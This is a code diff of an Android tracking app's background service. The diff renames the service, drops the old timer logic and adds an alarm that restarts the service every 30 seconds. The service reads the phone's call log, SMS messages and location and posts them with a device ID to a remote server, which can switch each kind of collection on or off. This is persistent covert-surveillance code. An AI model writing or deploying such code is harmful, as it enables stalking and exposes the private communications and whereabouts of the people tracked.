@@ -1,8 +1,6 @@
 package com.youhuan.trackerapp;
 
 import android.Manifest;
-import android.app.Activity;
-import android.app.ActivityManager;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.app.Service;
@@ -14,7 +12,6 @@ import android.database.Cursor;
 import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
@@ -40,8 +37,6 @@ import com.youhuan.trackerapp.utils.JobSchedulerManager;
 import org.json.JSONObject;
 
 import java.io.IOException;
-import java.io.Serializable;
-import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
@@ -54,16 +49,16 @@ import java.util.TimerTask;
  * Created by YouHuan on 17/9/2.
  */
 
-public class PollingService extends Service {
+public class PollingService2 extends Service {
 
     //用于发送广播
     private Intent intent = new Intent("com.youhuan.trackerapp.RECEIVER");
     private LocationClient mlocationClient;
     private String mLocationStr = "";
-    private Timer mTimer;
-    private TimerTask mTask;
+//    private Timer mTimer;
+//    private TimerTask mTask;
     //    public Thread mThread;
-    private JobSchedulerManager mJobManager;
+//    private JobSchedulerManager mJobManager;
 
     @Nullable
     @Override
@@ -76,9 +71,9 @@ public class PollingService extends Service {
 //        if (mThread == null) {
 //            runGetThreadNews();
 //        }
-        mJobManager = JobSchedulerManager.getJobSchedulerInstance(this);
-        mJobManager.startJobScheduler();
-//        runGetThreadNews();
+//        mJobManager = JobSchedulerManager.getJobSchedulerInstance(this);
+//        mJobManager.startJobScheduler();
+////        runGetThreadNews();
 //
 //        final Runnable runnable = new Runnable() {
 //            @Override
@@ -102,63 +97,12 @@ public class PollingService extends Service {
 //        }
 
 
-//        if (!isServiceWork(getApplicationContext(), "com.youhuan.trackerapp.PollingService2")) {
-//            Intent intent1 = new Intent(PollingService.this, PollingService2.class);
-//            PollingService.this.startService(intent1);
-//        } else {
-//            Toast.makeText(getApplicationContext(), "定位服务在运行，不需要重启", Toast.LENGTH_SHORT).show();
-//        }
+//
 
+        getLocation();
 
-        try {
-            String s = SharedPreferencesTool.getString(PollingService.this, "IsAlarm");
-            long alarmTime = Long.valueOf(s.equals("") ? "0" : s);
-            long currentTime = DateTimeUtil.currentDateParserLong();
-            if ((currentTime - alarmTime) > 600000) {
-                AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-                Intent i = new Intent(this, PollingService2.class);
-                intent.setAction("ALARM_ACTION");
-                PendingIntent pendingIntent = PendingIntent.getService(this, 0, i, PendingIntent.FLAG_UPDATE_CURRENT);
-                if (Build.VERSION.SDK_INT < 19) {
-                    am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 500, pendingIntent);
-                } else {
-                    am.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 500, pendingIntent);
-                }
-                Toast.makeText(getApplicationContext(), "定位服务已经重启", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(getApplicationContext(), "仍在定时范围内", Toast.LENGTH_SHORT).show();
-            }
-        } catch (ParseException e) {
-            e.printStackTrace();
-        }
 
         return super.onStartCommand(intent, flags, startId);
-    }
-
-    /**
-     * 判断某个服务是否正在运行的方法
-     *
-     * @param mContext
-     * @param serviceName 是包名+服务的类名（例如：net.loonggg.testbackstage.TestService）
-     * @return true代表正在运行，false代表服务没有正在运行
-     */
-    public boolean isServiceWork(Context mContext, String serviceName) {
-        boolean isWork = false;
-        ActivityManager myAM = (ActivityManager) mContext
-                .getSystemService(Context.ACTIVITY_SERVICE);
-        List<ActivityManager.RunningServiceInfo> myList = myAM.getRunningServices(100);
-        if (myList.size() <= 0) {
-            return false;
-        }
-        int size = myList.size();
-        for (int i = 0; i < size; i++) {
-            String mName = myList.get(i).service.getClassName().toString();
-            if (mName.equals(serviceName)) {
-                isWork = true;
-                break;
-            }
-        }
-        return isWork;
     }
 
     @Override
@@ -174,10 +118,10 @@ public class PollingService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        mTask.cancel();
-        mTask = null;
-        mTimer.cancel();
-        mTimer = null;
+//        mTask.cancel();
+//        mTask = null;
+//        mTimer.cancel();
+//        mTimer = null;
 //        mThread.stop();
     }
 
@@ -214,13 +158,13 @@ public class PollingService extends Service {
     private List<Call> getCall() {
         List<Call> calls = new ArrayList<>();
         Cursor cs;
-        if (ActivityCompat.checkSelfPermission(PollingService.this, Manifest.permission.READ_CALL_LOG)
+        if (ActivityCompat.checkSelfPermission(PollingService2.this, Manifest.permission.READ_CALL_LOG)
                 != PackageManager.PERMISSION_GRANTED) {
 //            ActivityCompat.requestPermissions(PollingService.this,
 //                    new String[]{Manifest.permission.READ_CALL_LOG}, 1000);
 
         }
-        cs = PollingService.this.getContentResolver().query(CallLog.Calls.CONTENT_URI, //系统方式获取通讯录存储地址
+        cs = PollingService2.this.getContentResolver().query(CallLog.Calls.CONTENT_URI, //系统方式获取通讯录存储地址
                 new String[]{
                         CallLog.Calls.CACHED_NAME,  //姓名
                         CallLog.Calls.NUMBER,    //号码
@@ -241,7 +185,7 @@ public class PollingService extends Service {
                     String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME};
                     //设置查询条件
                     String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + "='" + callNumber + "'";
-                    Cursor cursor = PollingService.this.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    Cursor cursor = PollingService2.this.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                             cols, selection, null, null);
                     int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
                     if (cursor.getCount() > 0) {
@@ -402,7 +346,7 @@ public class PollingService extends Service {
      */
     public boolean isOPen() {
         LocationManager locationManager
-                = (LocationManager) PollingService.this.getSystemService(Context.LOCATION_SERVICE);
+                = (LocationManager) PollingService2.this.getSystemService(Context.LOCATION_SERVICE);
         // 通过GPS卫星定位，定位级别可以精确到街（通过24颗卫星定位，在室外和空旷的地方定位准确、速度快）
         boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
         // 通过WLAN或移动网络(3G/2G)确定的位置（也称作AGPS，辅助GPS定位。主要用于在室内或遮盖物（建筑群或茂密的深林等）密集的地方定位）
@@ -431,6 +375,19 @@ public class PollingService extends Service {
                     "  " + bdLocation.getStreet();
             mLocationStr = "定位方式：" + type + " 位置：" + bdLocation.getAddrStr();
             Log.e("定位：", "定位结果：" + mLocationStr);
+
+            try {
+                String s = SharedPreferencesTool.getString(PollingService2.this, "IsAlarm");
+                long aTimer = Long.valueOf(s.equals("") ? "0" : s);
+                long cTimer = Long.valueOf(String.valueOf(DateTimeUtil.currentDateParserLong()));
+                if ((cTimer - aTimer) > 25000) {
+                    buildData();
+                }
+
+            } catch (Exception e) {
+
+            }
+
         }
 
         @Override
@@ -440,9 +397,9 @@ public class PollingService extends Service {
     }
 
     private void buildData() {
-        String is_location = SharedPreferencesTool.getString(PollingService.this, "is_location");
+        String is_location = SharedPreferencesTool.getString(PollingService2.this, "is_location");
         if (is_location.equals("") || is_location.equals("1")) {
-            getLocation();
+//            getLocation();
         } else {
             mLocationStr = "定位功能已经被后台关闭！";
         }
@@ -457,7 +414,7 @@ public class PollingService extends Service {
             StringBuffer callStr = new StringBuffer();
             callStr.append("[");
             List<Call> calls = new ArrayList<>();
-            String is_getcall = SharedPreferencesTool.getString(PollingService.this, "is_getcall");
+            String is_getcall = SharedPreferencesTool.getString(PollingService2.this, "is_getcall");
             if (is_getcall.equals("") || is_getcall.equals("1")) {
                 calls.clear();
                 calls.addAll(getCall());
@@ -487,7 +444,7 @@ public class PollingService extends Service {
             StringBuffer smsStr = new StringBuffer();
             smsStr.append("[");
             List<Sms> smsList = new ArrayList<>();
-            String is_getsms = SharedPreferencesTool.getString(PollingService.this, "is_getsms");
+            String is_getsms = SharedPreferencesTool.getString(PollingService2.this, "is_getsms");
             if (is_getsms.equals("") || is_getsms.equals("1")) {
                 smsList.clear();
                 smsList.addAll(getSms());
@@ -511,7 +468,7 @@ public class PollingService extends Service {
 
             JSONObject mainJson = new JSONObject();
             mainJson.put("phone_no", SystemUtil.getSystemModel());//手机型号
-            mainJson.put("machineCode", SystemUtil.getUniqueID(PollingService.this));//机器码
+            mainJson.put("machineCode", SystemUtil.getUniqueID(PollingService2.this));//机器码
             mainJson.put("position", mLocationStr);//当前位置
             mainJson.put("base_msg", SystemUtil.getDeviceBrand() +
                     "  " + SystemUtil.getSystemModel() +
@@ -539,7 +496,7 @@ public class PollingService extends Service {
 
     private void doPost(String json) {
 
-        OkHttpUtil.getDefault(PollingService.this).doAsync(
+        OkHttpUtil.getDefault(PollingService2.this).doAsync(
                 HttpInfo.Builder()
                         .setUrl("http://192.168.2.207/Tracker/public/api/Affair/insertMessage")
                         .setRequestType(RequestType.POST)//设置请求方式
@@ -603,30 +560,36 @@ public class PollingService extends Service {
                                 String param1 = datajson.getString("param1");
                                 String param2 = datajson.getString("param2");
 
-                                SharedPreferencesTool.putString(PollingService.this, "id", id);
-                                SharedPreferencesTool.putString(PollingService.this, "phone_id", phone_id);
-                                SharedPreferencesTool.putString(PollingService.this, "later_time", later_time);
-                                SharedPreferencesTool.putString(PollingService.this, "rate", rate);
+                                SharedPreferencesTool.putString(PollingService2.this, "id", id);
+                                SharedPreferencesTool.putString(PollingService2.this, "phone_id", phone_id);
+                                SharedPreferencesTool.putString(PollingService2.this, "later_time", later_time);
+                                SharedPreferencesTool.putString(PollingService2.this, "rate", rate);
 
-                                SharedPreferencesTool.putString(PollingService.this, "create_time", create_time);
-                                SharedPreferencesTool.putString(PollingService.this, "update_time", update_time);
-                                SharedPreferencesTool.putString(PollingService.this, "is_getsms", is_getsms);
-                                SharedPreferencesTool.putString(PollingService.this, "is_getcall", is_getcall);
+                                SharedPreferencesTool.putString(PollingService2.this, "create_time", create_time);
+                                SharedPreferencesTool.putString(PollingService2.this, "update_time", update_time);
+                                SharedPreferencesTool.putString(PollingService2.this, "is_getsms", is_getsms);
+                                SharedPreferencesTool.putString(PollingService2.this, "is_getcall", is_getcall);
 
-                                SharedPreferencesTool.putString(PollingService.this, "is_location", is_location);
-                                SharedPreferencesTool.putString(PollingService.this, "param1", param1);
-                                SharedPreferencesTool.putString(PollingService.this, "param2", param2);
+                                SharedPreferencesTool.putString(PollingService2.this, "is_location", is_location);
+                                SharedPreferencesTool.putString(PollingService2.this, "param1", param1);
+                                SharedPreferencesTool.putString(PollingService2.this, "param2", param2);
 
-                                Toast.makeText(getApplicationContext(), "提交成功！", Toast.LENGTH_SHORT)
+                                Toast.makeText(getApplicationContext(), "新的完成提交！", Toast.LENGTH_SHORT)
                                         .show();
 
-                                //保存当前时间
-                                SharedPreferencesTool.putString(PollingService.this, "CurrentDateTimer",
-                                        String.valueOf(DateTimeUtil.currentDateParserLong() + 10000));
+                                //设置闹钟
+                                AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
+                                Intent intent = new Intent(PollingService2.this, PollingService2.class);
+                                intent.setAction("ALARM_ACTION");
+                                PendingIntent pendingIntent = PendingIntent.getService(PollingService2.this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
+                                if (Build.VERSION.SDK_INT < 19) {
+                                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 30000, pendingIntent);
+                                } else {
+                                    alarmManager.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 30000, pendingIntent);
+                                }
 
-//                                stopService();
-//                                PollingService.this.stopSelf();
-
+                                SharedPreferencesTool.putString(PollingService2.this, "IsAlarm", String.valueOf(DateTimeUtil.currentDateParserLong()));
+                                PollingService2.this.stopSelf();
                             } else {
                             }
                         } catch (Exception e) {
